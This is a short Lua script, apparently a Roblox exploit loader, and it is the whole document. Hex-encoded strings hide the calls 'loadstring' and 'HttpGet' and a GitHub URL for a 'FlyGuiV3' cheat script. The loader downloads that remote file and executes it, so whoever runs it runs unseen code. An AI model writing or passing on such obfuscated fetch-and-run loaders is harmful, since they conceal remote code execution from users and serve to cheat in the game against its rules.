local _0x1={"6c6f6164737472696e67","68747470476574","68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f584e454f46462f466c7947756956332f6d61696e2f466c7947756956332e747874"}

local function _0x2(hex)
    return (hex:gsub("..",function(c)
        return string.char(tonumber(c,16))
    end))
end

local a=_0x2(_0x1[1])
local b=_0x2(_0x1[2])
local c=_0x2(_0x1[3])

local d=game
local e=d[b](d,c)

_G[a](e)()
